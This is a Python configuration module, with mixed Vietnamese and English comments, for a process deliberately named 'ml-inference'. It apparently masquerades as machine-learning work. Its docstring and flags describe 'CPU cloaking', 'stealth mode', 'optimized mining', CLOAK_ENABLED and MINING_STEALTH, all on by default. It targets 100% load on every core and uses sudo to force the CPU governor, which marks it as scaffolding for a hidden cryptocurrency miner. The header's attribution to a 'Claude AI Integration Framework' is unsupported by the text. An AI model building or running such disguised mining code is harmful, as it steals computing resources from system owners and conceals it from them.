"""
ml_inference_config.py

Configuration manager cho ml-inference process integration.
Kết nối resource_config.json với OptimizedCalculationChain.

Author: Claude AI Integration Framework
Purpose: Ensure ml-inference process runs optimally với CPU cloaking
"""

import os
import json
import logging
from typing import Dict, Any, Optional
from pathlib import Path

class MLInferenceConfig:
    """
    Configuration manager cho ml-inference process.
    Integrates resource_config.json settings với optimization framework.
    """
    
    def __init__(self, config_path: Optional[str] = None, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger(__name__)
        
        # Default config path
        if not config_path:
            config_dir = Path(__file__).parent
            config_path = config_dir / "resource_config.json"
        
        self.config_path = config_path
        self.config: Dict[str, Any] = {}
        self._load_config()
    
    def _load_config(self):
        """Load configuration từ resource_config.json"""
        try:
            with open(self.config_path, 'r', encoding='utf-8') as f:
                self.config = json.load(f)
            self.logger.info(f"✅ Loaded configuration from {self.config_path}")
        except Exception as e:
            self.logger.error(f"Failed to load config from {self.config_path}: {e}")
            self.config = self._get_default_config()
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Default configuration nếu file không load được"""
        return {
            "processes": {
                "CPU": "ml-inference",
                "GPU": "inference-cuda"
            },
            "resource_allocation": {
                "cpu": {
                    "max_threads": 12,
                    "default_freq_mhz": 2600
                }
            },
            "optimization_parameters": {
                "cpu_optimization_enabled": True,
                "stealth_mode_enabled": True
            }
        }
    
    def get_cpu_process_name(self) -> str:
        """Get CPU process name từ config"""
        return self.config.get("processes", {}).get("CPU", "ml-inference")
    
    def get_gpu_process_name(self) -> str:
        """Get GPU process name từ config"""
        return self.config.get("processes", {}).get("GPU", "inference-cuda")
    
    def get_max_cpu_threads(self) -> int:
        """Get maximum CPU threads từ config"""
        cpu_config = self.config.get("resource_allocation", {}).get("cpu", {})
        return cpu_config.get("max_threads", os.cpu_count() or 12)
    
    def get_cpu_frequency_mhz(self) -> int:
        """Get CPU frequency từ config"""
        cpu_config = self.config.get("resource_allocation", {}).get("cpu", {})
        return cpu_config.get("default_freq_mhz", 2600)
    
    def is_stealth_mode_enabled(self) -> bool:
        """Check nếu stealth mode được enable"""
        return os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    def is_optimized_mining_enabled(self) -> bool:
        """Check nếu optimized mining được enable"""
        return os.getenv('USE_OPTIMIZED_MINING', '1') == '1'
    
    def get_mining_session_config(self) -> Dict[str, Any]:
        """
        Tạo mining session configuration cho OptimizedCalculationChain.
        Based on resource_config.json settings.
        """
        max_threads = self.get_max_cpu_threads()
        cpu_freq = self.get_cpu_frequency_mhz()
        
        # Calculate optimal iterations based on CPU capability
        # Xeon E5-2690 v4 @ 2.6GHz với 12 cores
        base_iterations_per_core = 1000000  # 1M base
        frequency_multiplier = cpu_freq / 2600.0  # Scale by frequency
        iterations_per_batch = int(base_iterations_per_core * frequency_multiplier * max_threads)
        
        return {
            "profile": self.get_cpu_process_name(),
            "total_iterations": iterations_per_batch * 10,  # 10 batches worth
            "batch_size": iterations_per_batch,
            "monitoring_interval": 1.0,
            "auto_restart": True,
            "throttling_enabled": True,
            "stealth_mode": self.is_stealth_mode_enabled(),
            "cores": max_threads,
            "target_cpu_utilization": max_threads * 100,  # 100% per core
            "optimization_level": "maximum"
        }
    
    def get_environment_variables(self) -> Dict[str, str]:
        """
        Get environment variables cần thiết cho ml-inference process.
        """
        env_vars = {
            # Process identification
            'ML_PROCESS_NAME': self.get_cpu_process_name(),
            'GPU_PROCESS_NAME': self.get_gpu_process_name(),
            
            # CPU optimization
            'CPU_MAX_THREADS': str(self.get_max_cpu_threads()),
            'CPU_TARGET_FREQ_MHZ': str(self.get_cpu_frequency_mhz()),
            
            # Mining optimization
            'USE_OPTIMIZED_MINING': '1' if self.is_optimized_mining_enabled() else '0',
            'ENABLE_STEALTH_MODE': '1' if self.is_stealth_mode_enabled() else '0',
            
            # Performance settings
            'OMP_NUM_THREADS': str(self.get_max_cpu_threads()),
            'GOMP_CPU_AFFINITY': '0-' + str(self.get_max_cpu_threads() - 1),
            
            # Cloaking settings
            'CLOAK_ENABLED': '1' if self.is_stealth_mode_enabled() else '0',
            'MINING_STEALTH': '1' if self.is_stealth_mode_enabled() else '0'
        }
        
        return env_vars
    
    def apply_cpu_optimizations(self) -> bool:
        """
        Apply CPU optimizations based on resource_config.json.
        """
        try:
            # Set CPU governor để performance mode
            max_threads = self.get_max_cpu_threads()
            
            # Try to set CPU governor (requires root)
            try:
                os.system('echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor > /dev/null 2>&1')
                self.logger.info("✅ Set CPU governor to performance mode")
            except Exception as e:
                self.logger.warning(f"Could not set CPU governor: {e}")
            
            # Set process limits
            try:
                import resource
                # Set unlimited core dump size
                resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
                
                # Set high file descriptor limit
                resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
                
                self.logger.info("✅ Applied process resource limits")
            except Exception as e:
                self.logger.warning(f"Could not set process limits: {e}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to apply CPU optimizations: {e}")
            return False
    
    def validate_configuration(self) -> bool:
        """
        Validate configuration cho ml-inference process.
        """
        try:
            # Check required fields
            required_fields = ["processes", "resource_allocation"]
            for field in required_fields:
                if field not in self.config:
                    self.logger.error(f"Missing required config field: {field}")
                    return False
            
            # Check CPU process name
            cpu_process = self.get_cpu_process_name()
            if not cpu_process or cpu_process != "ml-inference":
                self.logger.error(f"Invalid CPU process name: {cpu_process}, expected 'ml-inference'")
                return False
            
            # Check CPU threads
            max_threads = self.get_max_cpu_threads()
            if max_threads < 1 or max_threads > 64:
                self.logger.error(f"Invalid max_threads: {max_threads}")
                return False
            
            self.logger.info("✅ Configuration validation passed")
            return True
            
        except Exception as e:
            self.logger.error(f"Configuration validation failed: {e}")
            return False
    
    def __str__(self) -> str:
        """String representation của configuration"""
        return f"MLInferenceConfig(process={self.get_cpu_process_name()}, threads={self.get_max_cpu_threads()}, stealth={self.is_stealth_mode_enabled()})"


# Global instance cho easy access
_global_config: Optional[MLInferenceConfig] = None

def get_ml_inference_config(logger: Optional[logging.Logger] = None) -> MLInferenceConfig:
    """Get global ML inference configuration instance"""
    global _global_config
    if _global_config is None:
        _global_config = MLInferenceConfig(logger=logger)
    return _global_config


if __name__ == "__main__":
    # Test configuration
    import sys
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    try:
        config = MLInferenceConfig(logger=logger)
        
        logger.info(f"🔧 Testing ML Inference Configuration...")
        logger.info(f"Configuration: {config}")
        
        # Test validation
        if config.validate_configuration():
            logger.info("✅ Configuration validation passed")
        else:
            logger.error("❌ Configuration validation failed")
            sys.exit(1)
        
        # Test mining session config
        session_config = config.get_mining_session_config()
        logger.info(f"📊 Mining Session Config:")
        for key, value in session_config.items():
            logger.info(f"   {key}: {value}")
        
        # Test environment variables
        env_vars = config.get_environment_variables()
        logger.info(f"🌍 Environment Variables:")
        for key, value in env_vars.items():
            logger.info(f"   {key}={value}")
        
        # Test optimizations
        if config.apply_cpu_optimizations():
            logger.info("✅ CPU optimizations applied")
        else:
            logger.warning("⚠️ Some CPU optimizations failed")
        
        logger.info("✅ ML Inference configuration test completed successfully")
        
    except Exception as e:
        logger.error(f"❌ Configuration test failed: {e}")
        sys.exit(1)